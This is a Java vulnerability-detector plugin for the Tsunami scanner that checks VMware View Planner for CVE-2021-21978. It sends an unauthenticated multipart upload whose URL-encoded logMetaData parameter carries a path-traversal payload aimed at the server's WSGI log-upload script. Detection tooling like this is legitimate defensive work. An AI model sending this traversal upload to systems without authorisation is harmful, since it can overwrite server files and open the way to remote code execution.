package com.google.tsunami.plugins.detectors.cves.cve202121978;

/*
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.common.net.HttpHeaders.*;
import static com.google.tsunami.common.net.http.HttpRequest.post;

import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;

import java.io.IOException;
import java.time.Clock;
import java.time.Instant;
import javax.inject.Inject;

@PluginInfo(
		type = PluginType.VULN_DETECTION,
		name = "CVE-2021-21978",
		version = "0.1",
		description = "VMware View Planner 4.x prior to 4.6 Security Patch 1 contains a remote code execution " +
				"vulnerability. Improper input validation and lack of authorization leading to arbitrary file" +
				" upload in logupload web application. An unauthorized attacker with network access to View " +
				"Planner Harness could upload and execute a specially crafted file leading to remote code " +
				"execution within the logupload container.",
		author = "hh-hunter",
		bootstrapModule = CVE202121978DetectorBootstrapModule.class)

public final class CVE202121978VulnDetector implements VulnDetector {

	private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();

	public static final String DETECTION_STRING = "File uploaded successfully.";

	private final HttpClient httpClient;

	private final Clock utcClock;

	// by the scanner.
	@Inject
	CVE202121978VulnDetector(@UtcClock Clock utcClock, HttpClient httpClient) {
		this.httpClient = checkNotNull(httpClient);
		this.utcClock = checkNotNull(utcClock);
	}

	@Override
	public DetectionReportList detect(
			TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
		logger.atInfo().log("CVE-2021-21978 starts detecting.");

		return DetectionReportList.newBuilder()
				.addAllDetectionReports(
						matchedServices.stream()
								.filter(NetworkServiceUtils::isWebService)
								.filter(this::isServiceVulnerable)
								.map(networkService -> buildDetectionReport(targetInfo, networkService))
								.collect(toImmutableList()))
				.build();
	}

	private boolean isServiceVulnerable(NetworkService networkService) {
		String targetUploadUri = NetworkServiceUtils.buildWebApplicationRootUrl(networkService) +
				"logupload?logMetaData=%7B%22itrLogPath%22%3A%20%22..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fhttpd%2" +
				"Fhtml%2Fwsgi_log_upload%22%2C%20%22logFileType%22%3A%20%22log_upload_wsgi.py%22%2C%20%22workloadID" +
				"%22%3A%20%222%22%7D";

		try {
			HttpResponse response = httpClient.send(
					post(targetUploadUri)
							.setHeaders(
									HttpHeaders.builder()
											.addHeader(CONTENT_TYPE, "multipart/form-data; boundary=----WebKitFormBoundaryVulnTest")
											.addHeader(ACCEPT, "text/html")
											.addHeader(REFERER, NetworkServiceUtils.buildWebApplicationRootUrl(networkService))
											.addHeader(CONNECTION, "close")
											.build())
							.setRequestBody(ByteString.copyFrom("------WebKitFormBoundaryVulnTest\n" +
									"        Content-Disposition: form-data; name=\"logfile\"; filename=\"\"\n" +
									"        Content-Type: text/plain\n" +
									"        TSUNAMI_COMMUNITY_VUL_TEST\n" +
									"        ------WebKitFormBoundaryVulnTest", "utf-8"))
							.build(),
					networkService);


			if (response.status().code() == 200 && response.bodyString().get().contains(DETECTION_STRING)) {
				return true;
			}

		} catch (IOException e) {
			logger.atWarning().withCause(e).log("Request to target %s failed", networkService);
			return false;
		}
		return false;
	}

	// This builds the DetectionReport message for a specific vulnerable network service.
	private DetectionReport buildDetectionReport(
			TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
		return DetectionReport.newBuilder()
				.setTargetInfo(targetInfo)
				.setNetworkService(vulnerableNetworkService)
				.setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
				.setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
				.setVulnerability(
						Vulnerability.newBuilder()
								.setMainId(
										VulnerabilityId.newBuilder()
												.setPublisher("TSUNAMI_COMMUNITY")
												.setValue("CVE_2021_21978"))
								.setSeverity(Severity.CRITICAL)
								.setTitle("CVE-2021-21978")
								.setDescription("VMware View Planner 4.x prior to 4.6 Security Patch 1 contains a " +
										"remote code execution vulnerability. Improper input validation and lack of " +
										"authorization leading to arbitrary file upload in logupload web application." +
										" An unauthorized attacker with network access to View Planner Harness could " +
										"upload and execute a specially crafted file leading to remote code execution" +
										" within the logupload container."))
				.build();
	}
}
